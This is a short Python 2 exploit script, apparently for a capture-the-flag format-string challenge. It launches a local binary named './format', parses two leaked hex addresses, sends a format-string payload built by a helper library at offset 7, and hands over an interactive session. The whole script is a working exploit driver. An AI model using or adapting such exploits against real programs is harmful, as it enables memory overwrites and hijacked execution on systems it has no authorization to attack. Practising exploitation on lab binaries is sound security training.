#!/usr/bin/python2
# coding: utf-8

from holypy.bin.formatstring import *
from holypy.bin.exputils import *

prog = spawn("./format")
prog.expect("\r\n")
func = int(prog.before, 16)
prog.expect("\r\n")
addr = int(prog.before, 16)
sendline(prog, payload(addr, func, 7))
interact(prog)
